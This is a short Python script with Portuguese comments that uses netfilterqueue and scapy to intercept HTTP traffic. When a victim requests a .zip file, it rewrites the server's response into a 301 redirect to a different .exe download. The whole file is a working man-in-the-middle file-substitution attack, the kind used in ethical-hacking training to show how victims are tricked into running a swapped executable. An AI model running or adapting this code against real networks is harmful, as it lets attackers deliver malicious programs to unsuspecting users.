#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())      #converte para scarpy
    if scapy_packet.haslayer(scapy.Raw):                #filtra camada Raw (contem o http)
        if scapy_packet[scapy.TCP].dport == 80:         #verifica se e request
            if ".zip" in scapy_packet[scapy.Raw].load:  #verifica se contem o arquivo
                print("[+] zip Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)  #armazena o ack na lista (handshake)
        elif scapy_packet[scapy.TCP].sport == 80:               #verifica se e response
            if scapy_packet[scapy.TCP].seq in ack_list:         #verifica se a response e de enteresse (se contem o ack)
                ack_list.remove(scapy_packet[scapy.TCP].seq)    #remove da lista se tiver
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar590.exe")
                packet.set_payload(str(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue() #cria instacia
queue.bind(0, process_packet)                   #associa com a queue 0 que foi criada
queue.run()                                     # executa
